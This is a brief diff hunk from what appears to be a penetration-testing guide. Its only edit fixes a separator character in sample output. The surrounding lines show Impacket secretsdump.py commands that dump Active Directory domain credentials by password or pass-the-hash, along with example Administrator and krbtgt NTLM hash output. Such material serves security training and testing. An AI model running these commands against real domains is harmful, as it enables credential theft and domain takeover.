@@ -360,7 +360,7 @@ python3 secretsdump.py domain.local/admin:password@DC_IP
 python3 secretsdump.py -hashes :NTLM_HASH domain.local/admin@DC_IP
 
 # Output:
-# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+# [*] Dumping Domain Credentials (domain/uid:rid:lmhash:nthash)
 # Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
 # krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
